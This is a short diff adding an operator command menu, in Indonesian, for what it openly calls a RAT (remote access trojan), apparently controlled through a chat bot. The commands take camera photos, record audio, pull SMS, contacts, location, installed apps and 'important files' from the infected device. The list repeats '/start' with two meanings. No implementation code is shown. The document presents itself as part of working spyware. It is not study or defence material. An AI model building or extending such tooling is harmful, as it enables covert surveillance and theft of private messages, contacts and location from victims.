@@ -1,0 +1,11 @@
+/start - Cek status device
+/status - Info lengkap device
+/photo - Ambil foto dari kamera
+/audio [detik] - Record audio
+/sms - Ambil SMS terbaru
+/contacts - Ambil kontak
+/location - Dapatkan lokasi sekarang
+/apps - List aplikasi terinstall
+/files - List file penting
+/stop - Pause RAT
+/start - Resume RAT
